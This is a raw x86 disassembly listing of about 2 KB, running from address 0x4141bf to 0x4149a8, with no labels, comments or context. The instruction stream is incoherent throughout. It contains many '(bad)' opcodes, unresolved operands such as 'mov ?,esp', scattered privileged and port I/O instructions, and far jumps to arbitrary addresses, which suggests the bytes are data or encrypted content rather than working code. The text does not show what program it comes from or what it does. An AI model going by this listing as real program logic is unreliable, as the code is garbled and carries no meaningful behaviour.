  4141bf:	mov    ds:0xf8490e3b,eax
  4141c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141c5:	mov    al,ds:0xc119530a
  4141ca:	sbb    DWORD PTR [edx],edi
  4141cc:	lahf   
  4141cd:	imul   DWORD PTR [esp+eax*4-0x7a]
  4141d1:	sub    ebp,DWORD PTR fs:[ebx+0x7d]
  4141d5:	xchg   BYTE PTR [ecx+edi*2-0x48],cl
  4141d9:	ja     0x41422b
  4141db:	jmp    0x161f81a
  4141e0:	dec    eax
  4141e1:	(bad)  
  4141e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141e3:	mov    esp,0xf690dd8c
  4141e8:	mov    ebp,0x803313b
  4141ed:	mov    eax,0xe68fbdf6
  4141f2:	dec    ebp
  4141f3:	mov    ?,esp
  4141f5:	pop    ebp
  4141f6:	mov    esi,fs
  4141f8:	jns    0x41426d
  4141fa:	push   ds
  4141fb:	out    dx,al
  4141fc:	(bad)  
  4141fd:	fld    QWORD PTR ds:0x82d16cc4
  414203:	addr16 push ecx
  414205:	scas   al,BYTE PTR es:[edi]
  414206:	scas   eax,DWORD PTR es:[edi]
  414207:	xchg   ebx,eax
  414208:	ds inc ecx
  41420a:	outs   dx,BYTE PTR ds:[esi]
  41420b:	sti    
  41420c:	adc    al,0x73
  41420e:	or     dl,BYTE PTR [esi]
  414210:	clc    
  414211:	and    edi,DWORD PTR [eax]
  414213:	mov    ecx,0xfc954628
  414218:	(bad)  
  41421a:	sub    al,0xfe
  41421c:	stos   BYTE PTR es:[edi],al
  41421d:	inc    edi
  41421e:	push   edx
  41421f:	pop    esi
  414220:	fdiv   st,st(7)
  414222:	pop    esi
  414223:	mov    ecx,0x40042e33
  414228:	dec    ebp
  414229:	repnz das 
  41422b:	imul   ebx,DWORD PTR [ecx-0x6a],0xffffffb2
  41422f:	imul   esp,DWORD PTR [ebp-0x6c9159e2],0xa3d547d6
  414239:	loopne 0x4142b3
  41423b:	addr16 inc ecx
  41423d:	mov    esp,ecx
  41423f:	test   BYTE PTR [ecx+0x1],cl
  414242:	mov    ah,ch
  414244:	pusha  
  414245:	pop    edi
  414246:	add    esi,DWORD PTR [ebx-0xbffb2db]
  41424c:	sub    esp,0xd8879ea4
  414252:	lds    ebx,FWORD PTR [ebx-0x656ab32e]
  414258:	repz call 0x7a2e:0x9a5510a9
  414260:	sbb    BYTE PTR [esi],ch
  414262:	rol    DWORD PTR [esp+ecx*2],0x8d
  414266:	xchg   ebx,eax
  414267:	adc    ah,BYTE PTR [eax+0x70]
  41426a:	sub    ah,ch
  41426c:	sbb    dl,al
  41426e:	add    eax,0x7a
  414271:	inc    ebx
  414272:	dec    edi
  414273:	sub    eax,0xdfe60df0
  414278:	jae    0x414219
  41427a:	jnp    0x414220
  41427c:	cld    
  41427d:	or     BYTE PTR [eax],ah
  41427f:	or     eax,0xc802a17b
  414284:	test   BYTE PTR [eax+0x5098a916],dh
  41428a:	adc    eax,0x22cdfbbb
  41428f:	outs   dx,BYTE PTR ds:[esi]
  414290:	ficom  DWORD PTR [edi]
  414292:	fsubr  DWORD PTR [edx-0x3]
  414295:	dec    esi
  414296:	bound  edi,QWORD PTR [esi+0x45]
  414299:	cwde   
  41429a:	xchg   ebp,eax
  41429b:	push   es
  41429c:	mov    bl,0x60
  41429e:	sub    ah,BYTE PTR [esp+ebx*1+0x7540cd9e]
  4142a5:	mov    ebp,0x6846594b
  4142aa:	fwait
  4142ab:	add    bl,BYTE PTR [eax-0x772d5ffc]
  4142b1:	scas   al,BYTE PTR es:[edi]
  4142b2:	jno    0x4142a4
  4142b4:	and    eax,0x43eb7880
  4142b9:	inc    ebp
  4142ba:	scas   al,BYTE PTR es:[edi]
  4142bb:	hlt    
  4142bc:	jns    0x414314
  4142be:	adc    eax,0x2c01c67b
  4142c3:	mov    bl,0xbd
  4142c5:	in     eax,dx
  4142c6:	and    cl,bl
  4142c8:	mov    dh,0x2e
  4142ca:	dec    ebp
  4142cb:	and    al,BYTE PTR [ebp+0x2fed8ba3]
  4142d1:	stos   BYTE PTR es:[edi],al
  4142d2:	(bad)  
  4142d3:	loop   0x4142a1
  4142d5:	icebp  
  4142d6:	shl    BYTE PTR ds:0x5c54c037,1
  4142dc:	jle    0x41432f
  4142de:	les    edx,FWORD PTR [edi+0x18]
  4142e1:	mov    bh,0xf0
  4142e3:	loope  0x4142b9
  4142e5:	jo     0x41426d
  4142e7:	in     al,dx
  4142e8:	sub    eax,0xc38fdd19
  4142ed:	add    al,0x49
  4142ef:	jge    0x414358
  4142f1:	xchg   ebp,eax
  4142f2:	pop    ds
  4142f3:	imul   ebx,ebp,0x56b78511
  4142f9:	sbb    cl,BYTE PTR [ebx+edi*1]
  4142fc:	cdq    
  4142fd:	adc    al,0x45
  4142ff:	test   al,0x18
  414301:	mov    ebx,0x69a695fa
  414306:	sbb    ah,BYTE PTR [edi+0x2ea80235]
  41430c:	pop    ecx
  41430d:	int3   
  41430e:	imul   edi,DWORD PTR [esi],0xddd941f1
  414314:	inc    edi
  414315:	cmp    ch,bh
  414317:	scas   al,BYTE PTR es:[edi]
  414318:	cmp    DWORD PTR [edi],esi
  41431a:	outs   dx,DWORD PTR ds:[esi]
  41431b:	push   ds
  41431c:	adc    DWORD PTR [esi-0x18],esp
  41431f:	sub    BYTE PTR [ebx+0x10],al
  414322:	mov    ah,0x80
  414324:	enter  0x809c,0xd0
  414328:	inc    esp
  414329:	mov    ecx,0xcdeac465
  41432e:	sbb    BYTE PTR [esi-0x3fd72972],dh
  414334:	div    BYTE PTR [edx-0x7abf797e]
  41433a:	sub    al,0x8a
  41433c:	out    0x29,eax
  41433e:	dec    edx
  41433f:	imul   esi,ecx,0x81abf8cf
  414345:	ins    DWORD PTR es:[edi],dx
  414346:	(bad)  
  414347:	lock aad 0xce
  41434a:	add    al,0x2e
  41434c:	das    
  41434d:	pop    ds
  41434e:	mov    edi,0x97d8081d
  414353:	push   ebx
  414354:	mov    esi,0x754c93bd
  414359:	mov    al,ds:0xd753c9c0
  41435e:	test   eax,0xd3ffb79f
  414363:	aam    0x30
  414365:	sub    BYTE PTR [edi],dh
  414367:	ret    0xb8f6
  41436a:	(bad)  
  41436c:	sbb    dh,BYTE PTR [ebp-0x30]
  41436f:	inc    edi
  414370:	mov    bl,0xab
  414372:	add    BYTE PTR [eax+esi*8+0x3],bl
  414376:	and    eax,0xa87c89f8
  41437b:	int3   
  41437c:	ins    BYTE PTR es:[edi],dx
  41437d:	in     eax,0x90
  41437f:	inc    esp
  414380:	shr    DWORD PTR [edx+0x32cad63f],1
  414386:	(bad)  
  414387:	jg     0x414336
  414389:	loopne 0x414336
  41438b:	cld    
  41438c:	and    DWORD PTR [bp+di],edx
  41438f:	xor    bh,BYTE PTR [ebp+0x43]
  414392:	xlat   BYTE PTR ds:[ebx]
  414393:	adc    DWORD PTR [ecx+0x61f616d8],esi
  414399:	pusha  
  41439a:	rcr    dh,cl
  41439c:	push   0xffffffd8
  41439e:	lods   eax,DWORD PTR ds:[esi]
  41439f:	mov    DWORD PTR [ebx-0x2d11b526],edx
  4143a5:	fucomp st(5)
  4143a7:	or     eax,DWORD PTR [esi-0x57]
  4143aa:	adc    BYTE PTR [edi+0x5cd2d4bf],ah
  4143b0:	std    
  4143b1:	sbb    bl,BYTE PTR [eax+0x26345cc7]
  4143b7:	ins    DWORD PTR es:[edi],dx
  4143b8:	cs mov bp,0xe00c
  4143bd:	jne    0x4143df
  4143bf:	jle    0x41442a
  4143c1:	clc    
  4143c2:	xchg   edi,eax
  4143c3:	xor    BYTE PTR [ebx],al
  4143c5:	add    al,0x53
  4143c7:	sar    BYTE PTR [ebp-0x27],cl
  4143ca:	call   0xa1c8:0xc5df9dee
  4143d1:	push   ebx
  4143d2:	sub    BYTE PTR [ecx+0x11],ch
  4143d5:	in     al,dx
  4143d6:	xor    DWORD PTR [edx+0x5b],edi
  4143d9:	xor    bl,ch
  4143db:	mov    ds:0x2ba5fffe,al
  4143e0:	pop    ss
  4143e1:	and    ah,BYTE PTR [edi+0x65b56199]
  4143e7:	xor    esp,DWORD PTR [ecx]
  4143e9:	xchg   eax,ecx
  4143eb:	dec    ecx
  4143ec:	rcl    BYTE PTR [edi+0x4ce11cbc],0xb4
  4143f3:	jno    0x414474
  4143f5:	ret    0x74e5
  4143f8:	(bad)  
  4143f9:	and    bh,BYTE PTR [ebx-0xe57d413]
  4143ff:	jmp    0xdbaf9d85
  414404:	loope  0x414459
  414406:	cmp    al,0x67
  414408:	lahf   
  414409:	bound  edi,QWORD PTR [ebp-0x7b39bddb]
  41440f:	popf   
  414410:	mov    ds:0x500a1878,eax
  414415:	push   ss
  414416:	add    al,0xd5
  414419:	enter  0x4060,0xd0
  41441d:	in     al,dx
  41441e:	jl     0x414419
  414420:	add    DWORD PTR [edx],0x3b
  414423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414424:	pushf  
  414425:	test   BYTE PTR [esp+ecx*4],ch
  414428:	and    eax,0xdcdee271
  41442d:	test   BYTE PTR [ebp+ecx*2-0x5cf7211d],bl
  414434:	aad    0x4
  414436:	in     al,dx
  414437:	xor    DWORD PTR [ebx],esp
  414439:	jp     0x4143c8
  41443b:	jns    0x4144ab
  41443d:	lock and BYTE PTR [eax-0x9937797],dh
  414444:	out    0xd5,eax
  414446:	mov    esi,0xfdfa02bc
  41444b:	lahf   
  41444c:	cmp    DWORD PTR [ecx-0x220ee0ea],0xffffffce
  414453:	xor    BYTE PTR [ebx-0x14],dh
  414456:	inc    esi
  414457:	adc    eax,0xcf6845b9
  41445c:	adc    ebx,ebp
  41445e:	ins    BYTE PTR es:[edi],dx
  41445f:	imul   esi,ebp,0x45f79d78
  414465:	mov    ecx,0x5a4684a
  41446a:	stc    
  41446b:	jne    0x414470
  41446d:	or     BYTE PTR [edx],bl
  41446f:	mov    ah,0x2c
  414471:	sbb    BYTE PTR [edx+0x59d41f17],dh
  414477:	xchg   edx,eax
  414478:	and    BYTE PTR [edx+0xe3daea2],0xd4
  41447f:	arpl   WORD PTR [edi-0x38ed9249],ax
  414485:	xchg   edi,eax
  414486:	fcomp  QWORD PTR [esi+edi*4-0x2fffd609]
  41448d:	fld    QWORD PTR [eax*2+0x24cf3b4c]
  414494:	vcvtsi2sd xmm5,xmm2,DWORD PTR [ecx+0x343000ab]
  41449c:	push   ebp
  41449d:	pop    ebx
  41449e:	mov    ch,BYTE PTR [esi-0xd]
  4144a1:	jge    0x414511
  4144a3:	dec    ecx
  4144a4:	retf   0xfa33
  4144a7:	fild   DWORD PTR [eax]
  4144a9:	jl     0x4144fc
  4144ab:	out    dx,al
  4144ac:	mov    ecx,0xad2cd97d
  4144b1:	icebp  
  4144b2:	cli    
  4144b3:	int    0x1a
  4144b5:	fnstsw WORD PTR [edi-0x207cc560]
  4144bb:	cld    
  4144bc:	mov    esp,0xb5927d41
  4144c1:	pop    ebx
  4144c2:	pusha  
  4144c3:	ret    
  4144c4:	jge    0x4144b6
  4144c6:	jae    0x4144cc
  4144c8:	cmp    BYTE PTR [edi-0x64],al
  4144cb:	sbb    eax,DWORD PTR [esi+ecx*1]
  4144ce:	adc    DWORD PTR [eax],0x8228763f
  4144d4:	cmp    DWORD PTR ds:0xaa86ce2f,esp
  4144da:	in     eax,0x15
  4144dc:	outs   dx,BYTE PTR ds:[esi]
  4144dd:	and    edi,edx
  4144df:	shl    DWORD PTR [ebx+edx*8-0x5e100b09],0xa7
  4144e7:	sbb    ch,BYTE PTR [edi-0x7e93090e]
  4144ed:	inc    ebx
  4144ee:	mov    DWORD PTR [ebx+0x0],edi
  4144f1:	inc    esi
  4144f2:	out    dx,al
  4144f3:	mov    esp,?
  4144f5:	sub    ch,BYTE PTR [ecx-0x52]
  4144f8:	ss (bad) 
  4144fa:	push   ds
  4144fb:	cmp    bl,BYTE PTR [ebx-0x4a]
  4144fe:	sbb    ah,BYTE PTR [edx]
  414500:	mov    ah,0xfa
  414502:	repnz scas eax,DWORD PTR es:[edi]
  414504:	shr    bh,cl
  414506:	cmp    al,BYTE PTR [ebp-0x37]
  414509:	stos   DWORD PTR es:[edi],eax
  41450a:	or     esp,DWORD PTR [ecx+0x63]
  41450d:	mov    dl,0x5e
  41450f:	xchg   ebp,eax
  414510:	daa    
  414511:	pushf  
  414512:	add    al,0xe4
  414514:	inc    ebp
  414515:	lods   al,BYTE PTR ds:[esi]
  414516:	dec    edx
  414517:	fdivr  DWORD PTR [ebx+0x68ab6646]
  41451d:	out    0x41,al
  41451f:	or     al,0x88
  414521:	and    BYTE PTR [ebp+0x53c835f5],bh
  414527:	lock push cs
  414529:	inc    ebp
  41452a:	jl     0x414595
  41452c:	stc    
  41452d:	retf   
  41452e:	mov    ebx,0x2c338b08
  414533:	add    esi,DWORD PTR [eax-0x13]
  414536:	or     al,0xb8
  414538:	sbb    cl,bh
  41453a:	or     ch,BYTE PTR [ecx+ebx*4-0x67]
  41453e:	iret   
  41453f:	sub    ebx,esp
  414541:	repz sub bl,cl
  414544:	push   ecx
  414545:	stos   BYTE PTR es:[edi],al
  414546:	stos   BYTE PTR es:[edi],al
  414547:	(bad)  
  414548:	je     0x41456a
  41454a:	jmp    0x41457f
  41454c:	sub    eax,0xb64db27e
  414551:	mov    ss,ecx
  414553:	mov    BYTE PTR [edi-0x45],dh
  414556:	fbstp  TBYTE PTR [ecx+eiz*4+0x6e]
  41455a:	push   esp
  41455b:	(bad)  
  41455c:	push   edx
  41455d:	push   edi
  41455e:	jno    0x4145d8
  414560:	out    0x45,eax
  414562:	add    DWORD PTR [esi],edi
  414564:	fnstenv [ebp+eax*1-0x64]
  414568:	js     0x414522
  41456a:	leave  
  41456b:	nop
  41456c:	pop    eax
  41456d:	mov    al,ds:0xe434f6b
  414572:	cmp    eax,0x356e7a43
  414577:	in     al,0x6d
  414579:	dec    esp
  41457a:	jno    0x4145f3
  41457c:	mov    bl,0x1f
  41457e:	push   0x99a77777
  414583:	adc    BYTE PTR [ebx+0xa],ch
  414586:	adc    eax,0x4d8ddecf
  41458b:	inc    esp
  41458c:	cmp    DWORD PTR [ebx+0xf],esp
  41458f:	lods   al,BYTE PTR ds:[esi]
  414590:	sbb    DWORD PTR [edx+0x4a],esi
  414593:	mov    dh,0x24
  414595:	fst    st(6)
  414597:	pop    ss
  414598:	fild   DWORD PTR [eax-0x58]
  41459b:	mov    DWORD PTR [edi-0x330d797d],ecx
  4145a1:	(bad)
  4145a4:	call   0xada3:0x49736e9d
  4145ab:	sub    eax,DWORD PTR ds:0xf4d9b448
  4145b1:	xchg   edx,eax
  4145b2:	xchg   edi,eax
  4145b3:	push   0xffffff99
  4145b5:	rcl    BYTE PTR [eax+edx*1-0x6514088],1
  4145bc:	lods   eax,DWORD PTR ds:[esi]
  4145bd:	fisub  DWORD PTR [ebp-0x28]
  4145c0:	and    esp,esp
  4145c2:	pop    esi
  4145c3:	cli    
  4145c4:	js     0x414589
  4145c6:	pop    edi
  4145c7:	add    ecx,DWORD PTR [ecx+0x399cd161]
  4145cd:	jecxz  0x4145ac
  4145cf:	sbb    cl,BYTE PTR [ebx]
  4145d1:	and    DWORD PTR [edx],edi
  4145d3:	test   BYTE PTR [edi-0x71d55a2c],dl
  4145d9:	scas   al,BYTE PTR es:[edi]
  4145da:	lds    esp,FWORD PTR ds:0x79b92569
  4145e0:	mov    ds:0x206d7c8b,al
  4145e5:	xchg   edx,eax
  4145e6:	cld    
  4145e7:	mul    BYTE PTR [eax-0x28]
  4145ea:	jns    0x74e72005
  4145f0:	jp     0x414609
  4145f2:	xchg   ecx,eax
  4145f3:	fs nop
  4145f5:	cmp    bh,BYTE PTR cs:[edi-0x3b157d20]
  4145fc:	ds jo  0x414630
  4145ff:	(bad)  
  414600:	mov    ds:0xd067567,eax
  414605:	test   eax,0x8afe7826
  41460a:	jae    0x414652
  41460c:	into   
  41460d:	mov    esp,0x84264471
  414612:	pop    ecx
  414613:	test   DWORD PTR [edx+0x51],ecx
  414616:	mov    esp,0x9f0e0745
  41461b:	pop    ebp
  41461c:	stos   DWORD PTR es:[edi],eax
  41461d:	call   0xa4eacf3b
  414622:	mov    cl,0x36
  414624:	xor    ecx,DWORD PTR [esi]
  414626:	icebp  
  414627:	stc    
  414628:	mov    BYTE PTR [esi*8-0x6f1157ac],dh
  41462f:	aam    0xd4
  414631:	arpl   WORD PTR [ebx],cx
  414633:	mov    al,ds:0xc1337309
  414638:	add    al,dh
  41463a:	mov    eax,DWORD PTR [eax-0x296e9b60]
  414640:	ja     0x4145f5
  414642:	dec    edi
  414643:	fcom   DWORD PTR [edi-0x1dcb97dc]
  414649:	or     eax,0x860121b
  41464e:	push   cs
  41464f:	or     al,0xed
  414651:	cdq    
  414652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414653:	aaa    
  414654:	or     bl,bh
  414656:	iret   
  414657:	jp     0x41462c
  414659:	das    
  41465a:	in     eax,dx
  41465b:	test   DWORD PTR [edi-0x6065b018],esi
  414661:	xchg   BYTE PTR [esi-0x5e],al
  414664:	cmp    bh,BYTE PTR [ebx+0x6b]
  414667:	enter  0x376f,0xa4
  41466b:	mov    ch,0x8a
  41466d:	inc    si
  41466f:	mov    dh,0xf1
  414671:	mov    ebx,0x6a73496c
  414676:	cwde   
  414677:	sbb    esi,DWORD PTR [ebx]
  414679:	aas    
  41467a:	sbb    eax,0x123d4e1c
  41467f:	dec    eax
  414680:	jne    0x41460c
  414682:	sbb    ch,0xd7
  414685:	lock daa 
  414687:	push   ds
  414688:	inc    edi
  414689:	inc    ebx
  41468a:	lea    ecx,[ebx+0x40]
  41468d:	retf   0xd532
  414690:	pop    edx
  414691:	mov    DWORD PTR [edi+0x5df60437],edi
  414697:	sbb    BYTE PTR [ecx-0x3a],ch
  41469a:	mov    dh,0x59
  41469c:	imul   eax,DWORD PTR [edx+0xd245223],0x1ef51261
  4146a6:	pusha  
  4146a7:	pop    ss
  4146a8:	xor    BYTE PTR [edi+0x65e7a2c0],ch
  4146ae:	in     eax,dx
  4146af:	mov    bl,bl
  4146b1:	mov    ch,0xe4
  4146b3:	in     eax,0xee
  4146b5:	add    al,0x8d
  4146b7:	mov    WORD PTR [ecx-0x15],ds
  4146ba:	pop    ecx
  4146bb:	loop   0x4146f3
  4146bd:	adc    eax,0xd3453e00
  4146c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146c3:	inc    eax
  4146c4:	xchg   edx,eax
  4146c5:	xchg   esi,eax
  4146c6:	push   edi
  4146c7:	pop    eax
  4146c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146c9:	aam    0xcd
  4146cb:	in     eax,0xeb
  4146cd:	cmp    eax,0x85a1e6bf
  4146d2:	popf   
  4146d3:	pop    eax
  4146d4:	jns    0x414667
  4146d6:	(bad)  
  4146d7:	popf   
  4146d8:	jne    0x41467a
  4146da:	inc    esi
  4146db:	outs   dx,BYTE PTR ds:[esi]
  4146dc:	push   ebx
  4146dd:	sub    edx,DWORD PTR [ecx-0x24]
  4146e0:	lock mov DWORD PTR [esi+eiz*4],ebx
  4146e4:	jge    0x414675
  4146e6:	mov    bl,0x14
  4146e8:	jne    0x414705
  4146ea:	xor    BYTE PTR [eax+ecx*8],dl
  4146ed:	in     al,0x5b
  4146ef:	addr16 sub edi,ecx
  4146f2:	cs scas eax,DWORD PTR es:[edi]
  4146f4:	inc    ebp
  4146f5:	lock shr DWORD PTR [eax+edi*8+0x7d],cl
  4146fa:	stos   BYTE PTR es:[edi],al
  4146fb:	sub    al,0x6d
  4146fd:	(bad)  
  4146ff:	inc    esi
  414700:	scas   eax,DWORD PTR es:[edi]
  414701:	fiadd  DWORD PTR cs:[edi]
  414704:	pop    ss
  414705:	imul   eax,DWORD PTR [esi+0x48],0x4b53f860
  41470c:	jno    0x414708
  41470e:	aas    
  41470f:	das    
  414710:	into   
  414711:	retf   
  414712:	repz arpl ax,bp
  414715:	or     eax,DWORD PTR [esi+0x37]
  414718:	dec    ebx
  414719:	mov    cl,0xc3
  41471b:	dec    ecx
  41471c:	ja     0x4146d6
  41471e:	inc    eax
  41471f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414720:	scas   al,BYTE PTR es:[edi]
  414721:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414722:	pop    eax
  414723:	mov    edi,0xe7620307
  414728:	sub    eax,0xf146320
  41472d:	mov    BYTE PTR [ecx+0x1d],ah
  414730:	cmp    bl,al
  414732:	jmp    0x4146be
  414734:	mov    al,0xa4
  414736:	in     eax,0x7
  414738:	push   ecx
  414739:	mov    BYTE PTR [ebx+edx*8-0x54823cfd],dh
  414740:	push   ds
  414741:	sahf   
  414742:	or     edx,0xdb650167
  414748:	sub    al,0x60
  41474a:	pop    ds
  41474b:	mov    bl,BYTE PTR [ebp+edi*8-0x7e]
  41474f:	into   
  414750:	imul   ebp,DWORD PTR [edx+0x24],0x24
  414754:	fwait
  414755:	push   ss
  414756:	fsub   QWORD PTR [ebx]
  414758:	jmp    0xa601c511
  41475d:	and    DWORD PTR [ebx],edi
  41475f:	xor    DWORD PTR [eax-0x613c38a5],esi
  414765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414766:	cli    
  414767:	adc    BYTE PTR [ebx+0xe6e6ad6],bh
  41476d:	sbb    eax,0x681c8e82
  414772:	test   BYTE PTR [edx-0x309ba81f],al
  414778:	push   0xffffffad
  41477a:	stc    
  41477b:	or     al,0x3a
  41477d:	jecxz  0x41473a
  41477f:	fisubr DWORD PTR [ecx+0x2ff24e34]
  414785:	rcl    DWORD PTR [esi-0x723ea748],cl
  41478b:	jbe    0x4147d4
  41478d:	dec    esi
  41478e:	test   al,0x80
  414790:	(bad)  
  414791:	mov    ebp,0xff4fea93
  414796:	(bad)  
  414797:	xlat   BYTE PTR ds:[ebx]
  414798:	or     bl,ah
  41479a:	mov    al,ds:0x29cd6e2b
  41479f:	arpl   di,ax
  4147a1:	fisttp DWORD PTR [eax+0x6db1196c]
  4147a7:	stc    
  4147a8:	sub    edx,esp
  4147aa:	jne    0x414820
  4147ac:	pop    es
  4147ad:	test   DWORD PTR [ebx-0x60],esi
  4147b0:	addr16 mov eax,0x68b4c192
  4147b6:	fs and ah,bh
  4147b9:	loop   0x414797
  4147bb:	test   BYTE PTR [ebp-0x3a],ah
  4147be:	and    DWORD PTR [esi],0xffffffc5
  4147c1:	dec    edx
  4147c2:	ss hlt 
  4147c4:	xlat   BYTE PTR ds:[ebx]
  4147c5:	inc    esp
  4147c6:	icebp  
  4147c7:	add    al,0xe6
  4147c9:	jbe    0x4147cc
  4147cb:	pop    ecx
  4147cc:	adc    ah,cl
  4147ce:	in     al,dx
  4147cf:	sub    DWORD PTR ds:0x1e6781e9,edx
  4147d5:	inc    ebp
  4147d6:	dec    ecx
  4147d7:	sub    BYTE PTR [ecx-0x19],bh
  4147da:	pop    ebp
  4147db:	pushf  
  4147dc:	xlat   BYTE PTR ds:[ebx]
  4147dd:	div    BYTE PTR [eax]
  4147df:	mov    eax,DWORD PTR [ebx]
  4147e1:	sbb    al,0xb8
  4147e3:	fsub   QWORD PTR [ecx]
  4147e5:	stos   BYTE PTR es:[edi],al
  4147e6:	jo     0x4147f1
  4147e8:	push   cs
  4147e9:	pusha  
  4147ea:	mov    al,ds:0xaa40a205
  4147ef:	sbb    BYTE PTR cs:[ecx+0x2ae5d2ed],bh
  4147f6:	popf   
  4147f7:	cld    
  4147f8:	adc    DWORD PTR [eax-0x6ff10856],esi
  4147fe:	das    
  4147ff:	mov    esi,0x5268a8a5
  414804:	or     eax,0xa807c157
  414809:	ror    DWORD PTR [edi+0x6a585098],cl
  41480f:	xor    eax,0xffdfb508
  414814:	pop    ss
  414815:	pop    esp
  414816:	(bad)  
  414818:	xor    eax,0x46757049
  41481d:	aam    0x3
  41481f:	js     0x4147ac
  414821:	or     DWORD PTR [ebx],esp
  414823:	adc    ah,BYTE PTR [ebp-0xa22bf38]
  414829:	xchg   edi,eax
  41482a:	cmp    esi,DWORD PTR [esi]
  41482c:	push   edx
  41482d:	cld    
  41482e:	or     BYTE PTR [ecx+0x27],ah
  414831:	lock mov ebx,0xf33158a8
  414837:	xor    ebx,DWORD PTR ds:0x4d2b1117
  41483d:	push   edx
  41483e:	inc    edi
  41483f:	cmc    
  414840:	cli    
  414841:	mov    WORD PTR ds:0x24352348,?
  414847:	push   ebx
  414848:	and    edi,DWORD PTR [ebp+0x58]
  41484b:	mov    ecx,0x530cc049
  414850:	mov    ecx,ss
  414852:	mov    dl,0x81
  414854:	dec    ecx
  414855:	aaa    
  414856:	push   edx
  414857:	enter  0x34a9,0x5f
  41485b:	ss pop edi
  41485d:	sub    ebp,DWORD PTR [ebp-0x3b]
  414860:	add    BYTE PTR [esi+0x37],bh
  414863:	scas   al,BYTE PTR es:[edi]
  414864:	test   BYTE PTR [eax-0x4a],bl
  414867:	(bad)  
  414869:	repz push esp
  41486b:	(bad)  
  41486c:	fimul  DWORD PTR [ecx+0xb02e7c1]
  414872:	dec    esi
  414873:	ins    BYTE PTR es:[edi],dx
  414874:	jo     0x41480d
  414876:	xor    esi,DWORD PTR [ebx+ecx*4]
  414879:	push   0xa
  41487b:	dec    edx
  41487c:	and    DWORD PTR [ecx-0x25e9a4fc],0x598ad0c7
  414886:	aad    0xf8
  414888:	push   edi
  414889:	lds    esi,FWORD PTR [esi+ebp*4]
  41488c:	outs   dx,DWORD PTR ds:[esi]
  41488d:	inc    esi
  41488e:	mov    eax,0x100acf90
  414893:	jp     0x4148ca
  414895:	fsub   QWORD PTR [ebx]
  414897:	add    ecx,DWORD PTR [edi]
  414899:	fcmovne st,st(6)
  41489b:	push   ss
  41489c:	aam    0x26
  41489e:	fnsave [esi+ebx*8]
  4148a1:	adc    esp,DWORD PTR [eax+edi*8-0x77]
  4148a5:	lahf   
  4148a6:	mov    al,0x75
  4148a8:	cmp    al,al
  4148aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148ab:	and    eax,edx
  4148ad:	push   esi
  4148ae:	sub    BYTE PTR [ebx-0x4ef403ad],al
  4148b4:	(bad)  
  4148b6:	out    0x1c,al
  4148b8:	mov    ecx,DWORD PTR [eax-0x55dfacd1]
  4148be:	add    DWORD PTR [ebp+0x1c5761c],0x967e688d
  4148c8:	dec    ebp
  4148c9:	enter  0xed82,0x40
  4148cd:	shl    DWORD PTR [edi],1
  4148cf:	sti    
  4148d0:	sub    esp,DWORD PTR [eax+eiz*2]
  4148d3:	icebp  
  4148d4:	pusha  
  4148d5:	pop    ds
  4148d6:	iret   
  4148d7:	cmp    eax,0x43768983
  4148dc:	popa   
  4148dd:	mov    BYTE PTR [esi-0x69],bl
  4148e0:	fwait
  4148e1:	adc    BYTE PTR [esi-0x7ca2c9c9],al
  4148e7:	les    ebp,FWORD PTR [esi+0x21]
  4148ea:	xor    esp,DWORD PTR [ebp-0x1f639134]
  4148f0:	add    esp,esi
  4148f2:	dec    eax
  4148f3:	sub    eax,0xbf912060
  4148f8:	xchg   edx,eax
  4148f9:	jp     0x414911
  4148fb:	sub    DWORD PTR es:[edi],esp
  4148fe:	iret   
  4148ff:	cmp    eax,0x411fb96e
  414904:	xchg   DWORD PTR [esp+ebp*2],ebp
  414907:	scas   eax,DWORD PTR es:[edi]
  414908:	int3   
  414909:	lock ret 
  41490b:	xor    eax,0xb4f40a16
  414910:	add    esi,DWORD PTR ds:0x2800251f
  414916:	inc    eax
  414917:	inc    eax
  414918:	mov    eax,0x1b32fc24
  41491d:	call   0x5603:0xc590c166
  414924:	push   cs
  414925:	sbb    BYTE PTR [eax],ah
  414927:	ss lock sub bl,al
  41492b:	cld    
  41492c:	cmp    DWORD PTR [ebp+0x61],esi
  41492f:	out    dx,eax
  414930:	jo     0x41494c
  414932:	jge    0x4148bb
  414934:	cli    
  414935:	fidivr WORD PTR [edi-0x67d42ab]
  41493b:	mov    al,ds:0x91abbeaf
  414940:	adc    eax,ebx
  414942:	pop    eax
  414943:	scas   al,BYTE PTR es:[edi]
  414944:	cmp    BYTE PTR [eax-0x289eaacc],ah
  41494a:	hlt    
  41494b:	adc    BYTE PTR [ecx+0x73],ah
  41494e:	out    0xea,al
  414950:	xchg   edx,eax
  414951:	jecxz  0x414929
  414953:	fistp  QWORD PTR [edx-0x793a37f1]
  414959:	pop    ds
  41495a:	mov    al,ds:0x13635adc
  41495f:	arpl   WORD PTR [eax+0x59f2dd6f],ax
  414965:	add    edi,esp
  414967:	push   esi
  414968:	scas   eax,DWORD PTR es:[edi]
  414969:	or     eax,esi
  41496b:	pop    ecx
  41496c:	xor    eax,0xc96513dd
  414971:	jp     0x414983
  414973:	frstor [ebx-0x335eb7d1]
  414979:	int    0xbc
  41497b:	iret   
  41497c:	clc    
  41497d:	outs   dx,DWORD PTR ds:[esi]
  41497e:	loope  0x414941
  414980:	sti    
  414981:	or     eax,0xf4d821b0
  414986:	and    ebp,ebx
  414988:	test   WORD PTR [eax+0x2f],di
  41498c:	mov    ebx,esp
  41498e:	add    al,0xbf
  414990:	fidivr WORD PTR [bp+di+0x214]
  414995:	(bad)  
  414996:	scas   eax,DWORD PTR es:[edi]
  414997:	cmc    
  414998:	pop    edi
  414999:	iret   
  41499a:	hlt    
  41499b:	ds popa 
  41499d:	xlat   BYTE PTR ds:[ebx]
  41499e:	test   al,0xd3
  4149a0:	out    dx,eax
  4149a1:	repz test al,0x66
  4149a4:	stos   DWORD PTR es:[edi],eax
  4149a5:	sbb    edi,DWORD PTR [eax-0x50]
  4149a8:	mul    DWORD PTR [ebp-0xc5ace6]
